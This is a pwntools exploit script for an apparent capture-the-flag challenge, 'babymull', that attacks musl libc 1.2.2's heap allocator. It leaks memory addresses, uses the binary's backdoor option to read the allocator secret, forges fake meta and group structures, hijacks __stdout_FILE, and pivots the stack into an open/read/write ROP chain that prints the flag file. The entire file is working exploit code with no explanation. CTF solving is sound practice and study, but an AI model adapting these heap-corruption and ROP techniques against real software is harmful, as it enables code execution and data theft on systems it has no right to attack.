from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('babymull')
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
# libc = ELF('/lib/x86_64-linux-musl/libc.so') 
elf = ELF('babymull')


def add(name, size, content):
    io.sendlineafter('Your choice >> ', '1')
    io.sendafter('Name: ', name)
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Content: ', content)


def delete(index):
    io.sendlineafter('Your choice >> ', '2')
    io.sendlineafter('Index: ', str(index))


def show(index):
    io.sendlineafter('Your choice >> ', '3')
    io.sendlineafter('Index: ', str(index))


def backdoor(addr1, addr2):
    io.sendlineafter('Your choice >> ', str(0x73317331))
    io.sendline(str(addr1))
    io.sendline(str(addr2))
    return int(io.recvline()[:-1], 16)


def pwn():
    for _ in range(5):
        add('a' * 0xf, 0x20, 'b' * 0x20)
    delete(0)
    add('a' * 0xf, 0x1000, '\n')
    add('a' * 0xf, 0x1000, b'\x00' * 0x238 + p32(0x5) + b'\n')
    show(5)
    io.recvuntil('a' * 0xf + 'b')
    mmap_base = u64(io.recvn(6).ljust(8, b'\x00')) - 0x1560
    libc_base = mmap_base + 0x4000
    secret = backdoor(mmap_base + 0x155e, libc_base + libc.sym['__malloc_context'])
    log.success('mmap_base: ' + hex(mmap_base))
    log.success('libc_base: ' + hex(libc_base))
    log.success('secret: ' + hex(secret))
    fake_meta_addr = mmap_base + 0x1000 + 8
    fake_group_addr = mmap_base + 0x550
    fake_meta  = p64(0) * 2 + p64(fake_group_addr)      # prev next mem
    fake_meta += p32(0) * 2 + p64((24 << 6) + 1)        # avail_mask free_mask sc+last_idx
    payload  = b'\x00' * 0x520
    payload += p64(fake_meta_addr)                      # fake group
    payload += b'\x00' * 0xaa8
    payload += p64(secret)                              # fake meta_area
    payload += fake_meta                                # fake meta
    delete(0)
    add('a' * 0xf, 0x1000, payload)
    delete(5)
    delete(0)

    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    __stdout_FILE = libc_base + libc.sym['__stdout_FILE']
    pop_rdi_ret = libc_base + 0x0000000000015536
    pop_rsi_ret = libc_base + 0x000000000001b3a9
    pop_rdx_ret = libc_base + 0x00000000000177c7
    long_jmp = libc_base + 0x000000000004bcf3
    ret = libc_base + 0x0000000000015238
    filename = b'./flag'
    filename_addr = mmap_base + 0x2aa0
    ROPchain_addr = filename_addr + 0x20
    
    fake_meta  = p64(0) * 2 + p64(__stdout_FILE - 0x940)# prev next mem
    fake_meta += p32(2) + p32(0) + p64((24 << 6) + 1)   # avail_mask free_mask sc+last_idx
    payload = b'\x00' * 0xfc8 + fake_meta + b'\n'
    add('a' * 0xf, 0x1000, payload)

    ROPchain  = p64(pop_rdi_ret) + p64(filename_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(ROPchain_addr + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
    ROPchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(ROPchain_addr + 0x100) + p64(pop_rdx_ret) + p64(0x40) + p64(write)
    payload  = filename.ljust(0x20, b'\x00')
    payload += ROPchain + b'\n'
    add('a' * 0xf, 0x1000, payload)

    payload  = b'\x00' * 0x20
    payload += p64(1) + p64(1)                      # f->wend, f->wpos
    payload += p64(ROPchain_addr) + p64(ret)        # rsp, rip
    payload += p64(0) + p64(long_jmp)               # padding, stack_pivot
    # gdb.attach(io)
    add('a' * 0xf, 0x800, payload + b'\n')
    
    # pause()
    flag = io.recvuntil('}')
    log.success(str(flag))


if __name__ == '__main__':
    pwn()
